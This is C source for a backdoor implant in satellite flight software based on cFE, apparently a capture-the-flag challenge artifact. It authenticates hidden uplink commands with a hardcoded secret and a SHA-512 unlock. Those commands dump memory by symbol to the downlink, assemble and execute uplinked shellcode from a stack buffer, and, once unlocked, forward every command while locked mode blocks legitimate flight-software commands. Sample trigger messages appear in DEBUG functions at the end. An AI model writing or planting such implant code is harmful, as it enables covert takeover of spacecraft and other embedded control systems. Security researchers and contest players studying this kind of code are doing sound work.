#include "implant.h"
#include "sha512.h"


const uint8_t Secret[8] = { 0x46,0x3b,0x98,0xfe,0x1e,0xe4,0x94,0xbb };

#define DUMP    1
#define UNLOCK  2
#define LOCK    3
#define SHELL   4

typedef struct {
    char        SymName[64];
    uint32_t    Offset;    
    uint32_t    Length;
} dump_cmd_t;

typedef struct {
    uint8_t     inputData[64];
} unlock_cmd_t;

typedef struct { 
    uint8_t  data[64];
    uint32_t len;
} shell_cmd_t;

typedef struct {
    uint8_t         header[8];
    uint8_t         secret[8];
    uint8_t         type;
    uint8_t         pad[3];
} Implant_Header_t;

typedef struct {
    Implant_Header_t    header;     
    union {
        dump_cmd_t      dump;
        unlock_cmd_t    unlock;
        shell_cmd_t     shell;
    } body;
} Backdoor_Msg_t, *Backdoor_MsgPtr_t;

static inline int MemEq(const uint8 *a, const uint8 *b, uint32_t len);
void Handle_Msg(fn_table_t *fn_table, CFE_SB_MsgPtr_t Msg);
void Implant_Msg(fn_table_t *fn_table, CFE_SB_MsgPtr_t Msg);
void CheckUnlock(fn_table_t *fn_table, CFE_SB_MsgPtr_t Msg);
void DoShellCode(fn_table_t *fn_table, const uint8_t *cmdStream, int len);

int UPLINK_Implant(CFE_SB_MsgPtr_t Msg)
{
    fn_table_t *fn_table  = (fn_table_t *)&State_Table;
    Backdoor_MsgPtr_t bdr = (Backdoor_MsgPtr_t) Msg;
    int MsgId             = fn_table->CFE_SB_GetMsgId(Msg);

    VERBOSE_LOG("Got Message: %04x, Type: %04x", MsgId, bdr->header.type);

    if (MsgId != IMPLANT_CMD_ID) 
    {
        VERBOSE_LOG("Handling Normal Message");
        Handle_Msg(fn_table, Msg);
        return 0;
    }        
        
    if (!MemEq(bdr->header.secret, Secret, 8)) 
    {
        VERBOSE_LOG("Invalid Secret: %02x%02x%02x%02x", 
            bdr->header.secret[0],
            bdr->header.secret[1],
            bdr->header.secret[2],
            bdr->header.secret[3] );
        return 1;
    }

    Implant_Msg(fn_table, Msg);
    VERBOSE_LOG("Done");
    return 0;
}

void Implant_Msg(fn_table_t *fn_table, CFE_SB_MsgPtr_t Msg)
{
    int     MsgLen = fn_table->CFE_SB_GetTotalMsgLength(Msg);
    Backdoor_MsgPtr_t bdr = (Backdoor_MsgPtr_t) Msg;

    char    EventString[122];
    uint8_t data, c;    
    int     address = 0, length = 0, ii = 0;


    switch(bdr->header.type)
    {
        case DUMP: 
        {
            if (MsgLen != sizeof(Implant_Header_t) + sizeof(dump_cmd_t))
            {
                VERBOSE_LOG("Bad Command Length");
                return;
            }

            fn_table->OS_SymbolLookup(&address, bdr->body.dump.SymName);
            address += bdr->body.dump.Offset;
            
            length  = bdr->body.dump.Length & 0x3F;
            *(uint32_t*)EventString = 0x44554d50;
            EventString[4] = ':'; 

            for (ii = 0; ii < length; ii++)
            {
                fn_table->CFE_PSP_MemRead8((void*)(address + ii), (uint8*)&data);
                c = (data >> 4);
                c += (c > 9 ? 48+7 : 48);
                EventString[5+ii*2] = c;
                
                c = (data & 0xF);
                c += (c > 9 ? 48+7 : 48);
                EventString[5+ii*2 + 1] = c;   
            }
            EventString[5+ii*2] = '\x00';

            DOWNLINK_LOG(EventString);
            return;
        }
        case UNLOCK:
            VERBOSE_LOG("Call Unlock");
            return CheckUnlock(fn_table, Msg);
        case LOCK:
            VERBOSE_LOG("Call Lock");
            fn_table->unlocked = FALSE;
            break;
        case SHELL:
            VERBOSE_LOG("Do Shell");
            return DoShellCode(fn_table, bdr->body.shell.data, bdr->body.shell.len );
    }
}

static inline int MemEq(const uint8 *a, const uint8 *b, uint32_t len)
{
    for (; len != 0; len--)
        if (a[len-1] != b[len-1])
            return 0;
    return 1;
} 
const uint8 hash_target[SHA512_DIGEST_SIZE] = { 
        0x12,0x62,0x70,0xf7,0xf6,0xd4,0x25,0xa2,0xa3,0xd1,0x5f,0x76,0x86,0x7a,0x38,0xf9,0xa6,
        0xae,0x9c,0x5e,0x8c,0x3d,0xdb,0x98,0x82,0x16,0xcd,0x29,0x9a,0x9d,0x78,0x60,0x30,0x87,
        0xc8,0x50,0x07,0x45,0x45,0x08,0x50,0xb5,0xfc,0x25,0x13,0xc7,0x71,0xc6,0xff,0xd1,0xac,
        0x91,0x1d,0x4d,0xd1,0x97,0xb9,0x87,0x02,0x08,0x99,0xfd,0x77,0x46 
    };

void CheckUnlock(fn_table_t *fn_table, CFE_SB_MsgPtr_t Msg)
{    
    uint8 digest[32];
    Sha512Context sha_ctxt;
    
    Backdoor_MsgPtr_t bdr = (Backdoor_MsgPtr_t) Msg;

    int MsgLen = fn_table->CFE_SB_GetTotalMsgLength(Msg);
    if (MsgLen != sizeof(Implant_Header_t) + sizeof(unlock_cmd_t))
    {
        VERBOSE_LOG("Bad Command Length: %d != %d", MsgLen, sizeof(Implant_Header_t) + sizeof(unlock_cmd_t));
        return;
    }

    sha512Init(&sha_ctxt);
    sha512Update(&sha_ctxt, (uint8*)Secret, sizeof(Secret));
    sha512Update(&sha_ctxt, bdr->body.unlock.inputData, sizeof(bdr->body.unlock.inputData));
    sha512Final(&sha_ctxt, digest);
    
    if (MemEq(digest, hash_target, sizeof(digest)))
    {
        VERBOSE_LOG("Unlock Success");
        fn_table->unlocked = TRUE;
    } else {
        VERBOSE_LOG("Unlock Failed");
        fn_table->unlocked = FALSE;
    }
    return;
}

#define START 0
#define END   1
#define WRITE 2
#define EXEC  3

typedef struct {
  uint8_t   command;
  uint8_t   offset; 
  uint8_t   payload[1];
} command_t;

void DoShellCode(fn_table_t *fn_table, const uint8_t *cmdStream, int len) 
{
  uint8_t code_buffer[32*4];
  int     command, length, result;
  uint8_t ii;  
  const uint8_t   *stream_ptr = cmdStream;
  const command_t *cmd_ptr = (const command_t*)stream_ptr;

  while (stream_ptr < cmdStream + len)
  {
    command =  cmd_ptr->command & 0x03;
    length  =  cmd_ptr->command & 0xFC;
    
    if ( *(int8_t*)(stream_ptr + 1) + length >= 31*4 )  
    {
      return; 
    }

    stream_ptr += 2;
    
    if (command == WRITE)
    {
        for (ii = 0; ii < length; ii++)
        {
            code_buffer[cmd_ptr->offset + ii] = stream_ptr[ii];
        }
        stream_ptr += length;    
    }
    else if (command == START)
    {
        code_buffer[cmd_ptr->offset]   = 0x9d;
        code_buffer[cmd_ptr->offset+1] = 0xe3;
        code_buffer[cmd_ptr->offset+2] = 0xbf;
        code_buffer[cmd_ptr->offset+3] = 0xa0;
    }
    else if (command == END)
    {
        code_buffer[cmd_ptr->offset]   = 0x81;
        code_buffer[cmd_ptr->offset+1] = 0xc7;
        code_buffer[cmd_ptr->offset+2] = 0xe0;
        code_buffer[cmd_ptr->offset+3] = 0x08;
          
        code_buffer[cmd_ptr->offset+4] = 0x81;
        code_buffer[cmd_ptr->offset+5] = 0xe8;
        code_buffer[cmd_ptr->offset+6] = 0x00;
        code_buffer[cmd_ptr->offset+7] = 0x00;        
    }
    else if (command == EXEC && fn_table->unlocked == TRUE)
    {
        result = ((int (*)(void))code_buffer)();
        DOWNLINK_LOG("Got %d\n", result);
    }
    else if (command == EXEC) 
    {
        DOWNLINK_LOG("Unlock if you want to Exec");
    }

    cmd_ptr = (command_t*) stream_ptr;  
  }

}

void Handle_Msg(fn_table_t *fn_table, CFE_SB_MsgPtr_t Msg)
{
    uint16 fnCode = 0;
    uint16 MsgId = fn_table->CFE_SB_GetMsgId(Msg);

    Backdoor_MsgPtr_t bdr = (Backdoor_MsgPtr_t) Msg;

    if (fn_table->unlocked) {
        VERBOSE_LOG("Unlocked, weapons free");
        fn_table->CFE_SB_SendMsg(Msg);
    } else {
        switch (MsgId)
        {
            case EYASSAT_MID :
                fnCode = fn_table->CFE_SB_GetCmdCode(Msg);
                if (fnCode == 2 && fnCode == 3 && fnCode == 12)
                {
                    DOWNLINK_LOG("OK, I guess you can do that...");
                    fn_table->CFE_SB_SendMsg(Msg);
                    return;
                }
            // Fallthrough
            case MD_CMD_MID  :
            case MM_CMD_MID  :
            case SC_CMD_MID  :
            case PL_IF_MID   :
            case KIT_SCH_MID :
            case HS_MID      :
            case LC_MID      :
            case HK_MID      :
            case FM_MID      :
            case EPHEM       :
            case DS_MID      :
            case CFE_TIME_MID:
            case CFE_TBL_MID :
            case CFE_SB_MID  :
            case CFE_EVS_MID :
            case CFE_ES      :
                DOWNLINK_LOG("Not on MY Satellite ;)");
                break;
            default: 
                DOWNLINK_LOG("OK, I guess you can do that...");
                fn_table->CFE_SB_SendMsg(Msg);
        }
    }
}

#ifdef DEBUG
void DEBUG_Telemetry_On(){
    char buff[] = "\x19\xd7\xc0\x00\x00\x01\x07\xf7";
    UPLINK_Implant((CFE_SB_MsgPtr_t)buff);
}

void DEBUG_Implant(){
    char buff[] = 
        "\x18\x34\xc0\x00\x00\x51\x00\x89\x46\x3b\x98\xfe\x1e" 
        "\xe4\x94\xbb\x04\x00\x00\x00\x03\x00"
        "\x06\xbc\x40\x06\x06\xbc"
        "\x06\xa0\x42\x80\x00\x38"
        "\x00\x00\x00\x00" 
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e";
    UPLINK_Implant((CFE_SB_MsgPtr_t)buff);
}

void DEBUG_Unlock_Normal(){
    char buff[] = 
        "\x18\x34\xc0\x00\x00\x4d\x00\x29\x46\x3b\x98\xfe\x1e\xe4\x94\xbb\x02\x00\x00\x00\x4f\x83\x30\x68\x54\x4b\xc6\xc7\xed\x76\x2e\x8b\x46"
        "\x35\x83\xca\x4a\x1a\x55\xfb\x9d\xe2\xd5\xc5\x68\xea\xce\xbb\x73\xdd\xb8\xa3\xd4\xb5\x3a\xb7\x77\x4a\xd3\xac\x85\xf1\x4e\x5a\x64\x81"
        "\x50\x06\x5e\x29\x61\xfa\xf9\x3f\xa5\xae\x21\x11\x69\x81\x7b\x27\x7a\x44";

    UPLINK_Implant((CFE_SB_MsgPtr_t)buff);
}

void DEBUG_DumpMemory(){
    char buff[] = 
        "\x18\x34\xc0\x00\x00\x55\x00\xf7\x46\x3b\x98\xfe\x1e\xe4\x94\xbb\x01\x00\x00\x00\x50\x4b\x54\x4d\x47"
        "\x52\x5f\x49\x6e\x67\x65\x73\x74\x43\x6f\x6d\x6d\x61\x6e\x64\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20";

    UPLINK_Implant((CFE_SB_MsgPtr_t)buff);
}
#endif